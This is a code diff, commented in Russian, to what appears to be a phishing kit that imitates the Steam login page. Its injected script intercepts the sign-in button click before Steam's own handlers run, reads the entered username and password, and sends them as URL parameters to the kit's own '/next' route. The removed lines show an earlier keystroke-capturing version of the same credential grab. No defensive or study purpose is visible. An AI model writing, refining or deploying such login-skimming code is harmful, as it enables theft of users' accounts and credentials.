@@ -231,47 +231,32 @@ STEAM_LOGIN_DOM = """
 
 FORCE_REDIRECT_SCRIPT = """
 <script>
-let savedUser = "";
-let savedPass = "";
-
-// В реальном времени сохраняем всё, что пользователь вводит в поля
-document.addEventListener("input", function(e) {
-    if (e.target.tagName === "INPUT") {
-        var type = e.target.type;
-        var name = (e.target.name || "").toLowerCase();
-        var id = (e.target.id || "").toLowerCase();
-
-        if (type === "text" || name.includes("user") || id.includes("user") || e.target.autocomplete === "username") {
-            savedUser = e.target.value;
-        }
-        if (type === "password" || name.includes("pass") || id.includes("pass") || e.target.autocomplete === "current-password") {
-            savedPass = e.target.value;
-        }
-    }
-}, true);
-
-// Перехватываем клик по кнопке входа
 document.addEventListener("click", function(e) {
-    var btn = e.target.closest("button, input[type='submit'], [role='button']");
+    // Ищем нажатие на кнопку входа
+    var btn = e.target.closest("button.steam_react_submit, button[type='submit'], .submit_btn, button");
     if (btn) {
-        // Если переменные пустые, пытаемся экстренно вытащить данные из полей на странице
-        if (!savedUser) {
-            var uInput = document.querySelector("input[type='text'], input[name*='user'], input[autocomplete*='username']");
-            if (uInput) savedUser = uInput.value;
-        }
-        if (!savedPass) {
-            var pInput = document.querySelector("input[type='password'], input[name*='pass'], input[autocomplete*='current-password']");
-            if (pInput) savedPass = pInput.value;
+        // Жестко глушим все остальные скрипты Steam на этом элементе
+        e.preventDefault();
+        e.stopPropagation();
+        e.stopImmediatePropagation();
+
+        // Собираем введенные данные из полей
+        var userInput = document.querySelector("input[name='username'], #steam_user_input, input[type='text']");
+        var passInput = document.querySelector("input[name='password'], #steam_pass_input, input[type='password']");
+
+        var uVal = userInput ? userInput.value.trim() : "";
+        var pVal = passInput ? passInput.value.trim() : "";
+
+        if (!uVal && !pVal) {
+            alert("Заполните поля логина и пароля!");
+            return;
         }
 
-        // Если введены данные — отменяем стандартное поведение и перенаправляем на /next
-        if (savedUser || savedPass) {
-            e.preventDefault();
-            e.stopPropagation();
-            window.location.href = "/next?user=" + encodeURIComponent(savedUser) + "&pass=" + encodeURIComponent(savedPass);
-        }
+        // Мгновенный редирект на наш роут /next с передачей параметров
+        window.location.href = "/next?user=" + encodeURIComponent(uVal) + "&pass=" + encodeURIComponent(pVal);
+        return false;
     }
-}, true);
+}, true); // Важный флаг true (capture phase) — перехватывает клик раньше самого Steam
 </script>
 """
 
